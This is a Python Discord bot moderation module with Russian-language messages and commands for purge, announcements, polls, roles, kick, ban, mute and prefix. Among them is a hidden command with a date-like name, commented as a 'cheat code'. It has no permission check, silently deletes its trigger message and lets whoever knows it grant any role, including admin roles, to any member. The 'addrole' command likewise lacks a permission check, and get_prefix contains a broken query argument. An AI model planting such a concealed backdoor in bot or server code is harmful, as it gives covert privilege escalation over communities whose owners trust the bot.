import discord
import sqlite3
import json
from config import config
from discord.ext import commands
import asyncio
from io import StringIO

class Admin(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
        self.connection = sqlite3.connect("database.db", timeout=10)
        self.cursor = self.connection.cursor()

    def get_prefix(self, cursor, message):
        cursor.execute(
            "SELECT * FROM prefixes WHERE guild_id = ?", 
            (
                message.guild.id
            )
        )
        result = cursor.fetchone()
        if result is not None:
            return result[1]
        else:
            return "+"

    #очистка чатов-----------------------------------------    
    @commands.command(aliases = ['Очистить', 'очистить', 'Очист', 'очист'])
    @commands.has_permissions(manage_messages=True)
    async def purge(self, ctx, amount: int=None):
        if amount == None:
            embed = discord.Embed(description=f":no_entry_sign: Введите `количество` для очистки!", colour=config.EMBED_COLOR_ERROR)
            await ctx.reply(embed = embed, mention_author=False)
        else:
            await ctx.channel.purge(limit=amount+1)
            embed = discord.Embed(description=f"Очищено `{amount}` сообщений!", colour=config.EMBED_COLOR)
            await ctx.send(embed = embed, delete_after=5)

    #объява-------------------------------------------------
    @commands.command(aliases = ['Обьявление', 'обьявление', 'Объявление', 'объявление', 'Объява', 'объява', 'Обьява', 'обьява'])
    @commands.has_permissions(administrator=True)
    async def inform(self, ctx, *, text):
        await ctx.channel.purge(limit = 1)
        emb = discord.Embed(color=config.EMBED_COLOR, title="Информация:", description=f'{text}')
        emb.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.send(embed=emb)

    #опрос-------------------------------------------------
    @commands.command(aliases = ['Опрос', 'опрос'])
    @commands.has_permissions(administrator=True)
    async def vote(self, ctx, *, text):
        await ctx.channel.purge(limit = 1)
        channel = ctx.channel
        emb = discord.Embed(title=f'Опрос:', description= f'{text}', colour=config.EMBED_COLOR)
        emb.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        message = await ctx.send(embed=emb)
        await message.add_reaction('✅')
        await message.add_reaction('❌')

    #добавить роль------------------------------------------
    @commands.command(aliases = ['Роль', 'роль'])
    async def addrole(self, ctx, member: discord.Member, role: discord.Role):
        """
        :param ctx:
        :param member:
        :param role:
        :return:
        """
        await member.add_roles(role)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{role.mention} была выдана для {member.mention}!') 
        await ctx.reply(embed=embed, mention_author=False) 

    #удалить роль------------------------------------------
    @commands.has_permissions(administrator=True)
    @commands.command(aliases = ['Удроль', 'удроль'])
    async def removerole(self, ctx, member: discord.Member, role: discord.Role):
        """
        :param ctx:
        :param member:
        :param role:
        :return:
        """
        await member.remove_roles(role)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{role.mention} была изъята у {member.mention}!')
        await ctx.reply(embed=embed, mention_author=False) 
        
    #кик----------------------------------------------------
    @commands.command(aliases = ['Кик', 'кик'])
    @commands.has_permissions(administrator = True)
    async def kick(self, ctx, member: discord.Member, *, reason=None): 
       await member.kick(reason = reason)
       embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был кикнут\nПричина: `{reason}`')
       await ctx.send(embed = embed)

    #бан----------------------------------------------------
    @commands.command(aliases = ['Бан', 'бан'])
    @commands.has_permissions(administrator = True)
    async def ban(self, ctx, member: discord.Member, *, reason=None):
        await member.ban(reason = reason)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был забанен\nПричина: `{reason}`')
        embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.reply(embed=embed, mention_author=False) 

    #разбан-------------------------------------------------
    @commands.command(aliases = ['Разбан', 'разбан'])
    @commands.has_permissions(administrator=True)
    async def unban(self, ctx, *, member):
        """
        :param ctx:
        :param member:
        :return:
        """
        banned_users = await ctx.guild.bans()
        for ban_entry in banned_users:
            user = ban_entry.user
            print("\"" + user.name + "#" + user.discriminator + "\"", "\"" + member + "\"")
            if user.name + "#" + user.discriminator == member:
                await ctx.guild.unban(user)
                embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был разбанен')
                embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
                await ctx.reply(embed=embed, mention_author=False) 

    #мут----------------------------------------------------
    @commands.command(aliases = ['Мут', 'мут', 'Мьют', 'мьют'])
    @commands.has_permissions(administrator = True)
    async def mute(self, ctx, member: discord.Member, *, reason=None):
        await ctx.send('Выполнянется обработка...', delete_after=7)
        guild = ctx.guild
        mutedRole = discord.utils.get(guild.roles, name = 'Мут by Yalfer')
        if not mutedRole:
            mutedRole = await guild.create_role(name = 'Мут by Yalfer')
        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak = False, send_messages = False)
        await member.add_roles(mutedRole, reason = reason)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был `замьючен`\nПричина: `{reason}`')
        embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.send(embed = embed)

    #размут-------------------------------------------------
    @commands.command(aliases = ['Размут', 'размут', 'Размьют', 'размьют'])
    @commands.has_permissions(administrator = True)
    async def unmute(self, ctx, member: discord.Member):
        mutedRole = discord.utils.get(ctx.guild.roles, name = 'Мут by Yalfer')
        await member.remove_roles(mutedRole)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был `размьючен`')
        embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.send(embed = embed)


    #чит-код-------------------------------------------------
    @commands.command()
    async def y02052021(self, ctx, member :discord.Member, role: discord.Role):
        await ctx.channel.purge(limit = 1)
        """
        :param ctx:
        :param member:
        :param role:
        :return:
        """
        await member.add_roles(role)

    #префикс------------------------------------------------
    @commands.has_permissions(administrator = True)
    @commands.command(aliases = ['Префикс', 'префикс'])
    async def prefix(self, ctx, *, prefix: str): 
        author = ctx.message.author
        self.cursor.execute("DELETE FROM prefixes WHERE guild_id = ?", (ctx.guild.id,))
        self.cursor.execute("INSERT INTO prefixes VALUES (?, ?)", (ctx.guild.id, prefix))
        self.connection.commit()
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{author.mention} изменил префикс на `{prefix}`')
        await ctx.send(embed = embed)

'''   
    #логи------------------------------------------------
    @commands.has_permissions(administrator=True)
    @commands.command(aliases = ['Логи', 'логи', 'Лог', 'лог'])
    async def set_logs(self, ctx, channel: discord.TextChannel):
        channel_id = channel.id
        guild_id = ctx.guild.id
        self.cursor.execute(
            "SELECT * FROM log_channel WHERE guild_id = ?",
            (
                guild_id,
            )
        )
        result = self.cursor.fetchone()
        if result is None:
            self.cursor.execute(
                "INSERT INTO log_channel VALUES(?, ?)",
                (
                    guild_id,
                    channel_id
                )
            )
            self.connection.commit()
            embed = discord.Embed(colour=config.EMBED_COLOR_ERROR, description = f'Нет результатов!')
            await ctx.send(embed = embed)
        else:
            self.cursor.execute(
                "UPDATE log_channel SET channel_id = ? WHERE guild_id = ?",
                (
                    channel_id,
                    guild_id
                )
            )
            self.connection.commit()
            embed = discord.Embed(colour=config.EMBED_COLOR, description = f'`{channel}` был выбран для откладки логов')
            await ctx.send(embed = embed)

    #логи------------------------------------------------
    @commands.has_permissions(administrator=True)
    @commands.command(aliases = ['Логивыкл', 'логивыкл', 'Логвыкл', 'логвыкл'])
    async def logs_off(self, ctx):
        guild = ctx.guild
        guild_id = guild.id
        self.cursor.execute(
            "DELETE FROM log_channel WHERE guild_id = ?",
            (
                guild_id,
            )
        )
        self.connection.commit()
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'Логи были выключены!')
        await ctx.send(embed = embed)
'''
    
#Cog-----------------------------------------------------
def setup(bot):
   bot.add_cog(Admin(bot))